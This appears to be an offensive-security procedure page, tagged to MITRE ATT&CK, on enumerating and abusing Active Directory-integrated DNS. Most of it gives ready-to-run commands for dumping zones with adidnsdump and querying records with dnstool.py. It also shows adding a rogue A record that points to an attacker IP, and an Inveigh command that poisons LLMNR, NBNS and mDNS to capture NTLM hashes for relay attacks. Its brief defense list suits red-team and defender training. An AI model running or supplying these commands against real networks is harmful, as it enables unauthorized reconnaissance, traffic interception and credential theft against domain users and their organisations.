---
id: 07d082fe-909e-4f90-8636-21f3522d117b
name: Active-Directory-Integrated-DNS-Enumeration
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:06.640933Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Discovery|TA0007 - Discovery]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - '[[techniques/Domain Trust Discovery|T1482 - Domain Trust Discovery]]'
  - >-
    [[techniques/Exploitation of Remote Services|T1210 - Exploitation of Remote
    Services]]
  - '[[techniques/Query Registry|T1012 - Query Registry]]'
  - >-
    [[techniques/System Information Discovery|T1082 - System Information
    Discovery]]
sub_techniques: []
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/Active Directory Integrated DNS]]'
commands:
  - '[[commands/adidnsdump-enumerate-zones]]'
  - '[[commands/dnstool-query-dns-records]]'
  - '[[commands/dnstool-add-dns-record]]'
  - '[[commands/invoke-inveigh-adidns-recon]]'
platforms:
  - Windows
tools:
  - '[[tools/adidnsdump]]'
  - '[[tools/dnstool]]'
  - '[[tools/Inveigh]]'
validated: true
---

# Active-Directory-Integrated-DNS-Enumeration

## Summary

This procedure demonstrates how to enumerate Active Directory Integrated DNS zones and records to discover network hosts, services, and potential misconfigurations. Using tools like adidnsdump, dnstool.py, and Inveigh, attackers can query DNS data stored in Active Directory, identify domain controllers, service records, and even add rogue records for further exploitation in a Windows domain environment.

## Description

Active Directory Integrated DNS stores DNS zones directly in the Active Directory database, allowing replication across domain controllers. This integration enables attackers with domain credentials to query sensitive DNS information, such as A, MX, SRV records, which reveal internal hosts, email servers, and service locations. The procedure covers enumeration via direct zone dumping, record querying, record addition for persistence or redirection, and passive reconnaissance using protocol poisoning. It targets Windows Server environments with Active Directory and is useful during lateral movement or discovery phases. Prerequisites include valid domain user credentials and network access to a domain controller. Success reveals network topology and enables targeted attacks like DNS spoofing.

## Requirements

1. Valid domain user credentials (DOMAIN\user format) with access to query or modify DNS.
2. Network connectivity to a domain controller (TCP/UDP port 53 for DNS, TCP 445 for SMB if needed).
3. Installed tools: adidnsdump (Python-based), dnstool.py (from Impacket suite), Inveigh (PowerShell module).
4. Python 3 environment for adidnsdump and dnstool.py; PowerShell for Inveigh.

## Defense

- Implement network segmentation to restrict DNS server access to authorized systems only.
- Monitor DNS queries, zone transfers, and record modifications using tools like Windows DNS logging or SIEM integration.
- Enforce least privilege: Limit user accounts from querying or modifying DNS zones.
- Enable DNSSEC for record integrity validation and deploy IDS/IPS to detect anomalous DNS traffic like wildcard queries or unauthorized additions.

## Objectives

1. Enumerate all DNS zones and records to map the domain's network assets.
2. Discover hosts, services, and domain controllers for targeted exploitation.
3. Identify misconfigurations or add rogue records to facilitate man-in-the-middle attacks or persistence.

## Instructions

### Step 1: Enumerate DNS Zones Using adidnsdump

**Context**: This step dumps all DNS zones from the Active Directory-integrated DNS server, providing an overview of configured zones and potential entry points for further enumeration. It uses TCP for reliable querying and requires domain credentials.

**Command** ([[commands/adidnsdump-enumerate-zones]]):
```bash
adidnsdump -u DOMAIN\\user --print-zones dc.domain.corp --dns-tcp
```

> Authenticate with domain credentials to query the domain controller. The --print-zones flag lists all zones without dumping full records, helping identify scope quickly. Expected output includes a list of zone names like _msdcs.domain.corp and domain.corp, revealing forest and domain zones.

### Step 2: Query Specific DNS Records Using dnstool.py

**Context**: Query for specific record types (e.g., all records with *) to discover hosts and services. This leverages LDAP to access AD-stored DNS data, useful for targeted reconnaissance after zone enumeration.

**Command** ([[commands/dnstool-query-dns-records]]):
```bash
python dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action query dc.domain.corp --legacy
```

> Provide credentials and target the domain controller. The --record '*' queries all types; --legacy handles older Windows Server versions. Expected output shows records like A records for hosts (e.g., dc.domain.corp A 192.168.1.10) and SRV records for services, enabling host discovery.

### Step 3: Add a DNS Record Using dnstool.py

**Context**: Demonstrate persistence or redirection by adding a custom DNS record, such as pointing a hostname to an attacker-controlled IP. This requires write permissions on the DNS zone and can facilitate phishing or traffic interception.

**Command** ([[commands/dnstool-add-dns-record]]):
```bash
python dnstool.py -u 'DOMAIN\user' -p 'password' --record A --action add --data 'attackerhost 192.168.1.100' dc.domain.corp
```

> Specify the record type (A for IPv4), action add, and data in 'hostname IP' format. Target the domain controller. Expected output confirms the record addition (e.g., "Record added successfully"), verifiable by subsequent queries. Use cautiously in labs to avoid production disruption.

### Step 4: Perform Passive ADIDNS Reconnaissance Using Inveigh

**Context**: Use Inveigh for passive monitoring and poisoning of LLMNR, NBNS, and mDNS to capture NTLM hashes or spoof DNS responses based on ADIDNS data. This step focuses on opportunistic attacks during enumeration.

**Command** ([[commands/invoke-inveigh-adidns-recon]]):
```powershell
Invoke-Inveigh -ConsoleOutput Y -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3 -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts Y
```

> Run in PowerShell on a compromised host in the domain. It listens for name resolution requests and spoofs based on ADIDNS records (combo, NS, wildcard types) with a threshold of 3 matches. Expected output in console shows captured requests, hashes, or spoofed responses, aiding in relay attacks.
